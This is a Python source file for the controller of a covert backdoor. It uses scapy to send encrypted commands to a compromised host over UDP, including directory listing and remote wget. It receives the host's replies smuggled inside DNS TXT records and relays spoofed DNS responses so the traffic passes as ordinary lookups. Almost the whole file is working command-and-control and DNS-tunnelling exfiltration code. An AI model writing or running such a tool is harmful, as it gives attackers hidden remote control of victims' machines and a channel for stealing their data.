
from utils.shell import *
from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
from utils.encryption import *
from multiprocessing import Process, SimpleQueue
import argparse
from ipaddress import ip_address, IPv6Address
from sys import exit
from time import sleep

# Command Line Arguments
parser = argparse.ArgumentParser("./main.py")
parser.add_argument("controller_ip", help="The IPv4 address of the controller host")
parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
args = parser.parse_args()

# Validate Arguments

CONTROLLER_IP = args.controller_ip
BACKDOOR_IP = args.backdoor_ip
NETWORK_INTERFACE = args.interface

queue = SimpleQueue()

# Initialize the encryption context.
encryption_handler = StreamEncryption()
encryption_handler.read_nonce("data/nonce.bin")
encryption_handler.read_secret("data/secret.key")
encryption_handler.initialize_encryption_context()

def subprocess_packet_handler(pkt):
    if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
        return None
    # 1. Get the data in the TXT record.
    encrypted_message = pkt[UDP].ar.rdata[0]
    # 2. Put the data in the queue.
    queue.put(encrypted_message)
    # 3. Craft a legit query.
    forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
    # 4. sr1 the DNS query to a legit DNS server.
    response = sr1(forged, verbose=0)
    # 5. send the response back to the backdoor machine.
    response[IP].src = f"{CONTROLLER_IP}"
    response[IP].dst = f"{BACKDOOR_IP}"
    send(response, verbose=0)

def subprocess_start():
    sniff(filter=f"ip src host {BACKDOOR_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)

def send_udp(data: str):
    """
        Sends a UDP packet to the backdoor which is supposed to contain a command. 
        All commands get sent to a specific UDP port on the backdoor machine. 
        The UDP packet that is sent contains the encrypted command in the payload 
        section. The backdoor machine listens for a specific port to know that 
        the UDP packet is ours.
    """
    data = data.encode("utf-8")
    # Encrypt the data.
    data = encryption_handler.encrypt(data)
    # Forge the UDP packet.
    pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{BACKDOOR_IP}")/UDP(sport=10069, dport=10420, len=len(data))
    pkt[UDP].payload = Raw(data)
    # Send the packet.
    send(pkt, verbose=0)

def handle_wget(data):
    # 1. Send command
    send_udp(data)
    # 2. Receive response
    encrypted = None
    while True:
        if queue.empty():
            sleep(0.5)
            continue
        encrypted = queue.get()
        break
    decrypted = encryption_handler.decrypt(encrypted)
    print(f"Response: {decrypted.decode('utf-8')}")

if __name__ == "__main__":

    # Start the secondary process which sniffs for DNS requests from the backdoor,
    # decodes the attached information, and forwards the DNS request to a legitimate server,
    # then forwards the legitmate response back to the backdoor.
    decode_process = Process(target=subprocess_start)
    decode_process.start()

    # Main shell loop
    print_menu()
    while True:
        try:
            command = input("λ: ")
        except KeyboardInterrupt:
            break
        args = command.split(" ")
        arg_count = len(args)
        if arg_count == 1:
            if command == HELP:
                print_help()
                continue
            elif command == CLEAR:
                clear_screen()
                continue
            elif command == EXIT:
                break
        if arg_count == 2:
            if args[0] == LIST:
                file_path = args[1]
                data = args[0] + " " + args[1]
                # Send the command to backdoor.
                send_udp(data)
                # Receive the response.
                encrypted = None
                while True:
                    if queue.empty():
                        continue
                    encrypted = queue.get()
                    break
                decrypted = encryption_handler.decrypt(encrypted)
                print(f"Response: {decrypted.decode('utf-8')}")
                continue
        if arg_count == 3:
            if args[0] == WGET:
                url = args[1]
                filepath = args[2]
                data = args[0] + " " + args[1] + " " + args[2]
                handle_wget(data)
                continue
        else:
            print(f"Command not found: {command}")
    decode_process.kill()
